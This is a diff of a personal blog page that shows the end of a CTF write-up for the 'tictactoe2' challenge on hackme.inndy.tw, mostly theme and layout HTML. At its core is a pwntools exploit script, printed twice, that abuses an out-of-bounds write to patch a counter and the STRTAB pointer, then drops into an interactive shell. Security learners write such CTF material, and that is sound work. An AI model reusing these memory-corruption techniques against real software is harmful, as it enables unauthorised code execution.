-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./tictactoe'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./tictactoe'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = <span class="string">'hackme.inndy.tw'</span></span><br><span class="line">    port = <span class="string">'7714'</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line">    elf = ELF(<span class="string">'./tictactoe'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">    ru(<span class="string">"flavor):"</span>)</span><br><span class="line">    sl(<span class="string">'9'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(value)</span><br><span class="line">    offset = addr - <span class="number">0x804B056</span></span><br><span class="line">    ru(<span class="string">'flavor): '</span>)</span><br><span class="line">    sl(str(offset))</span><br><span class="line"></span><br><span class="line">targe = <span class="number">0x8049fc8</span></span><br><span class="line">addr_STRTAB = <span class="number">0x0804AF58</span></span><br><span class="line">n = <span class="number">0x0804B048</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line"></span><br><span class="line">rc()</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">change(n,<span class="string">'\x99'</span>)                <span class="comment">#0</span></span><br><span class="line">change(n,<span class="string">'\x73'</span>)                <span class="comment">#1</span></span><br><span class="line">change(addr_STRTAB,<span class="string">'\xc8'</span>)      <span class="comment">#2</span></span><br><span class="line">change(n + <span class="number">1</span>,<span class="string">'\x68'</span>)            <span class="comment">#3</span></span><br><span class="line">change(addr_STRTAB + <span class="number">1</span>,<span class="string">'\x9f'</span>)  <span class="comment">#4</span></span><br><span class="line">change(n+<span class="number">2</span>,<span class="string">'\x00'</span>)              <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">change(n+<span class="number">0x10</span>,<span class="string">'\xff'</span>)           <span class="comment">#6</span></span><br><span class="line">change(bss+<span class="number">0x100</span>,<span class="string">'\xff'</span>)        <span class="comment">#7</span></span><br><span class="line">change(bss+<span class="number">0x100</span>,<span class="string">'\xff'</span>)        <span class="comment">#8</span></span><br><span class="line">rc()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 1
 
-      
-    </div>
+if local:
+    p = process(&#39;./tictactoe&#39;)
+    elf = ELF(&#39;./tictactoe&#39;)
+    libc = elf.libc
+else:
+    host = &#39;hackme.inndy.tw&#39;
+    port = &#39;7714&#39;
+    p = remote(host,port)
+    elf = ELF(&#39;./tictactoe&#39;)
 
-    
+context.arch = elf.arch
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level=&#39;debug&#39;
 
-    
-    
-    
+def sd(content):
+    p.send(content)
 
-    
+def sl(content):
+    p.sendline(content)
 
-    
-      
-    
-    
+def rc():
+    return p.recv()
 
-    
-      <div>
-        
+def ru(content):
+    return p.recvuntil(content)
 
+def debug(addr,PIE=False):
+    if PIE:
+        text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print }}&#39;&quot;.format(p.pid)).readlines()[1], 16)
+        gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr)))
+    else:
+        gdb.attach(p,&quot;b *{}&quot;.format(hex(addr)))
 
+def change(addr,value):
+    ru(&quot;flavor):&quot;)
+    sl(&#39;9&#39;)
+    sleep(0.1)
+    sl(value)
+    offset = addr - 0x804B056
+    ru(&#39;flavor): &#39;)
+    sl(str(offset))
 
+targe = 0x8049fc8
+addr_STRTAB = 0x0804AF58
+n = 0x0804B048
+bss = elf.bss()
 
-  
+rc()
+sl(&#39;1&#39;)
+change(n,&#39;\x99&#39;)                #0
+change(n,&#39;\x73&#39;)                #1
+change(addr_STRTAB,&#39;\xc8&#39;)      #2
+change(n + 1,&#39;\x68&#39;)            #3
+change(addr_STRTAB + 1,&#39;\x9f&#39;)  #4
+change(n+2,&#39;\x00&#39;)              #5
 
+change(n+0x10,&#39;\xff&#39;)           #6
+change(bss+0x100,&#39;\xff&#39;)        #7
+change(bss+0x100,&#39;\xff&#39;)        #8
+rc()
+p.interactive()
+</code></pre>
 
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/09/24/2018-9-24-tictactoe2-writeup/" title="tictactoe2 writeup">http://yoursite.com/2018/09/24/2018-9-24-tictactoe2-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/09/24/2018-9-24-tictactoe-writeup/" rel="next" title="tictactoe1 writeup">
-                <i class="fa fa-chevron-left"></i> tictactoe1 writeup
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/24/2018-9-24-mailer-writeup/" rel="prev" title="mailer writeup">
-                mailer writeup <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/hackme-inndy-writeup/">hackme.inndy_writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
 
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
             
-          
-          
-
+          </div>
         </div>
       </div>
-
-      
-
-      
-
     </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "tictactoe2 writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
